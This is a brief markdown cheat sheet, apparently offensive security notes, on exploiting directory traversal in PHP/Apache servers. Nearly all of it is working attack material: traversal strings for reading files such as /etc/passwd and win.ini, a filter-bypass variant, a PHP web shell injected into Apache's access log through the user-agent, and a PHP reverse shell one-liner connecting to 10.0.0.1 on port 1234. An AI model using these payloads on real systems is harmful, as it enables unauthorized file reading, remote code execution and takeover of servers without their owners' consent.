# Directory Traversal

## PHP apache server directory traversal scenerios

Apache2 files are stored in /var/www/html. So to get out from the directory, we need `../../../`\
In windows, the attack is like `..\..\..\windows\win.ini`

### Strategies

- Look in the url for `?filename=something.ext` type stuff.
- try to bypass with as much `../` as needed
- If relative path does not work correctly, try absolute path.
- If protected with non-recursive filter, use `....//....//....//etc/passwd`

### Revshell

- apache2 servers has got their log file is `/var/log/apache2/access.log`
- test `<?php system($_GET['cmd']);?>` in the user-agent section or any user controllable section
- reverse shell `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`